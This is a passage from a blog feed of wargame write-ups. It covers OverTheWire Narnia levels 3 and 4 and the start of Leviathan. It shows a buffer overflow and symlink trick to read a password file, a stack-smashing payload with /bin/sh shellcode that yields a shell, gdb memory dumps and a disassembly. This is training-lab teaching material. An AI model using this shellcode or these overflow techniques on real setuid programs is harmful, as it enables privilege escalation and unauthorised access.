        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((ofd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(ofile,O_RDWR))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofile);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((ifd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(ifile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifile);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* copy from file1 to file2 */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(ifd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(ofd,buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;copied contents of %s to a safer place... (%s)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,ifile,ofile);&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* close &amp;#39;em */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;close(ifd);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;close(ofd);&lt;/span&gt;
 
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don&amp;rsquo;t control the stack,
we control where the file gets written to. &lt;code&gt;/dev/null&lt;/code&gt; is not a useful place
for data, and we want the contents of &lt;code&gt;/etc/narnia_pass/narnia4&lt;/code&gt;. As &lt;code&gt;narnia3&lt;/code&gt; runs
setuid narnia4, it can do that for us.&lt;/p&gt;

&lt;p&gt;First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
&lt;code&gt;narnia4&lt;/code&gt; that is 32 characters long, and then write that to the target. The issue here
is that the source path&amp;rsquo;s last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Now when we pass that to &lt;code&gt;narnia3&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia3@melinda:/narnia$ ./narnia3 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;/tmp/&amp;#39; + &amp;#39;x&amp;#39;*27 + &amp;#39;/tmp/narn4&amp;#39;&amp;quot;`&lt;/span&gt; 
copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
narnia3@melinda:/narnia$ cat /tmp/narn4 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That&amp;rsquo;s why we have
the double &lt;code&gt;/tmp&lt;/code&gt; setup.&lt;/p&gt;

&lt;h2 id=&#34;level-04:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 04&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;ctype.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(buffer,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;MOAR OVERFLOWS. This time you&amp;rsquo;ll notice something at line 6. What this does
is &lt;a href=&#34;http://man7.org/linux/man-pages/man7/environ.7.html&#34;&gt;store the user environment&lt;/a&gt;.
This then get zerod out inside &lt;code&gt;main&lt;/code&gt; to prevent us from storing any shellcode
in environment variables. However we might still be able to write &lt;code&gt;EIP&lt;/code&gt;, so using the
trusty pattern generator from before&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia4@melinda:/narnia$ gdb -q ./narnia4 
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let&amp;rsquo;s find out what we need to write into
&lt;code&gt;EIP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;a&amp;#39;*272 + &amp;#39;bbbb&amp;#39;&amp;quot;)
Starting program: /games/narnia/narnia4 $(python -c &amp;quot;print &amp;#39;a&amp;#39;*272 + &amp;#39;bbbb&amp;#39;&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacea
0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc
0xffffd5e0:	0x0804825c	0xf7fca000	0x00000000	0x00000000
0xffffd5f0:	0x00000000	0x7cc8a421	0x44f76031	0x00000000
0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd610:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550
0xffffd640:	0x080485c0	0xf7feb180	0xffffd64c	0x0000001c
0xffffd650:	0x00000002	0xffffd78f	0xffffd7a5	0x00000000
0xffffd660:	0xffffd8ba	0xffffd8ce	0xffffd8de	0xffffd8f1
0xffffd670:	0xffffd914	0xffffd927	0xffffd930	0xffffd93d
0xffffd680:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd6c0:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd6d0:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4
0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000
0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2
0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000
0xffffd760:	0x00000000	0x00000000	0x9e000000	0x9213cb6c
0xffffd770:	0x8eef41b1	0xe0574cc7	0x69a73659	0x00363836
0xffffd780:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd790:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f
0xffffd7a0:	0x3461696e	0x61616100	0x61616161	0x61616161
0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd800:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd810:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd820:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626261	0x00000062	0x00000000
0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Our input starts at around &lt;em&gt;0xffffd7a8&lt;/em&gt; so let&amp;rsquo;s get going writing our payload.
Create a nopsled that is &lt;em&gt;272 - 25&lt;/em&gt; bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside &lt;em&gt;gdb&lt;/em&gt; are a bit different.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia4@melinda:/narnia$ ./narnia4 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\x90&amp;#39;*(272-25) + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;\x30\xd8\xff\xff&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Leviathan</title>
      <link>http://unlogic.co.uk/2015/03/23/solving-leviathan/</link>
      <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/23/solving-leviathan/</guid>
      <description>

&lt;p&gt;After having done &lt;a href=&#34;http://overthewire.org/wargames/bandit/&#34;&gt;Bandit&lt;/a&gt;, let&amp;rsquo;s move
on to &lt;a href=&#34;http://overthewire.org/wargames/leviathan/&#34;&gt;Leviathan&lt;/a&gt;. None of the levels
have hints, so there won&amp;rsquo;t be any links to each of the levels.&lt;/p&gt;

&lt;p&gt;Without further ado, let&amp;rsquo;s get cracking.&lt;/p&gt;

&lt;h1 id=&#34;level-0-1:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 0 -&amp;gt; 1&lt;/h1&gt;

&lt;p&gt;Logging in with &lt;code&gt;leviathan0:leviathan0&lt;/code&gt; we take a quick look around to see
what we have to work with, if anything&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14 10:32 .
drwxr-xr-x 167 root       root       4096 Mar 21 06:46 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Feb 10 18:08 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let&amp;rsquo;s take a look in that &lt;code&gt;.backup&lt;/code&gt; folder.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan0@melinda:~$ ls .backup/
bookmarks.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Checking the contents of the file, we see it really is a list of bookmarks.
Going on the assumption that the password for the next level is in there, let&amp;rsquo;s
grep for &lt;em&gt;leviathan&lt;/em&gt; in this file&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan0@melinda:~$ grep leviathan .backup/bookmarks.html 
&amp;lt;DT&amp;gt;&amp;lt;A HREF=&amp;quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&amp;quot; ADD_DATE=&amp;quot;1155384634&amp;quot; LAST_CHARSET=&amp;quot;ISO-8859-1&amp;quot; ID=&amp;quot;rdf:#$2wIU71&amp;quot;&amp;gt;password to leviathan1&amp;lt;/A&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there it is&lt;/p&gt;

&lt;h1 id=&#34;level-1-2:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 1 -&amp;gt; 2&lt;/h1&gt;

&lt;p&gt;As usual we login, do a &lt;code&gt;ls -la&lt;/code&gt; and see a &lt;code&gt;check&lt;/code&gt; binary that is setuid &lt;code&gt;leviathan2&lt;/code&gt;.
Let&amp;rsquo;s run it and see what happens&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan1@melinda:~$ ./check 
password: test
Wrong password, Good Bye ...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Trying the usual &lt;code&gt;strings check&lt;/code&gt; shows us a couple of interesting strings: &lt;code&gt;secret&lt;/code&gt; and &lt;code&gt;love&lt;/code&gt;.
Neither one or both will return success. Hrmm. Ok, let&amp;rsquo;s take a look at the
disassembly&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) disass main
Dump of assembler code for function main:
   0x0804852d &amp;lt;+0&amp;gt;:	push   %ebp
   0x0804852e &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x08048530 &amp;lt;+3&amp;gt;:	and    $0xfffffff0,%esp
   0x08048533 &amp;lt;+6&amp;gt;:	sub    $0x30,%esp
   0x08048536 &amp;lt;+9&amp;gt;:	mov    %gs:0x14,%eax
   0x0804853c &amp;lt;+15&amp;gt;:	mov    %eax,0x2c(%esp)
   0x08048540 &amp;lt;+19&amp;gt;:	xor    %eax,%eax
   0x08048542 &amp;lt;+21&amp;gt;:	movl   $0x786573,0x18(%esp)
   0x0804854a &amp;lt;+29&amp;gt;:	movl   $0x72636573,0x25(%esp)
   0x08048552 &amp;lt;+37&amp;gt;:	movw   $0x7465,0x29(%esp)
   0x08048559 &amp;lt;+44&amp;gt;:	movb   $0x0,0x2b(%esp)
   0x0804855e &amp;lt;+49&amp;gt;:	movl   $0x646f67,0x1c(%esp)
   0x08048566 &amp;lt;+57&amp;gt;:	movl   $0x65766f6c,0x20(%esp)
   0x0804856e &amp;lt;+65&amp;gt;:	movb   $0x0,0x24(%esp)
   0x08048573 &amp;lt;+70&amp;gt;:	movl   $0x8048680,(%esp)
   0x0804857a &amp;lt;+77&amp;gt;:	call   0x80483c0 &amp;lt;printf@plt&amp;gt;
   0x0804857f &amp;lt;+82&amp;gt;:	call   0x80483d0 &amp;lt;getchar@plt&amp;gt;
   0x08048584 &amp;lt;+87&amp;gt;:	mov    %al,0x14(%esp)
   0x08048588 &amp;lt;+91&amp;gt;:	call   0x80483d0 &amp;lt;getchar@plt&amp;gt;
   0x0804858d &amp;lt;+96&amp;gt;:	mov    %al,0x15(%esp)
   0x08048591 &amp;lt;+100&amp;gt;:	call   0x80483d0 &amp;lt;getchar@plt&amp;gt;
   0x08048596 &amp;lt;+105&amp;gt;:	mov    %al,0x16(%esp)
   0x0804859a &amp;lt;+109&amp;gt;:	movb   $0x0,0x17(%esp)
   0x0804859f &amp;lt;+114&amp;gt;:	lea    0x18(%esp),%eax
   0x080485a3 &amp;lt;+118&amp;gt;:	mov    %eax,0x4(%esp)
   0x080485a7 &amp;lt;+122&amp;gt;:	lea    0x14(%esp),%eax
   0x080485ab &amp;lt;+126&amp;gt;:	mov    %eax,(%esp)
   0x080485ae &amp;lt;+129&amp;gt;:	call   0x80483b0 &amp;lt;strcmp@plt&amp;gt;
   0x080485b3 &amp;lt;+134&amp;gt;:	test   %eax,%eax
   0x080485b5 &amp;lt;+136&amp;gt;:	jne    0x80485c5 &amp;lt;main+152&amp;gt;
   0x080485b7 &amp;lt;+138&amp;gt;:	movl   $0x804868b,(%esp)
   0x080485be &amp;lt;+145&amp;gt;:	call   0x8048400 &amp;lt;system@plt&amp;gt;
   0x080485c3 &amp;lt;+150&amp;gt;:	jmp    0x80485d1 &amp;lt;main+164&amp;gt;
   0x080485c5 &amp;lt;+152&amp;gt;:	movl   $0x8048693,(%esp)
   0x080485cc &amp;lt;+159&amp;gt;:	call   0x80483f0 &amp;lt;puts@plt&amp;gt;
   0x080485d1 &amp;lt;+164&amp;gt;:	mov    $0x0,%eax
   0x080485d6 &amp;lt;+169&amp;gt;:	mov    0x2c(%esp),%edx
   0x080485da &amp;lt;+173&amp;gt;:	xor    %gs:0x14,%edx
   0x080485e1 &amp;lt;+180&amp;gt;:	je     0x80485e8 &amp;lt;main+187&amp;gt;
   0x080485e3 &amp;lt;+182&amp;gt;:	call   0x80483e0 &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x080485e8 &amp;lt;+187&amp;gt;:	leave  
   0x080485e9 &amp;lt;+188&amp;gt;:	ret    
End of assembler dump.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So it uses &lt;code&gt;strcmp&lt;/code&gt; to compare our input to whatever the right pass is (&lt;code&gt;0x080485ae&lt;/code&gt;)
I&amp;rsquo;m going to use &lt;code&gt;ltrace&lt;/code&gt; to trace through the library call and see what that reveals&lt;/p&gt;

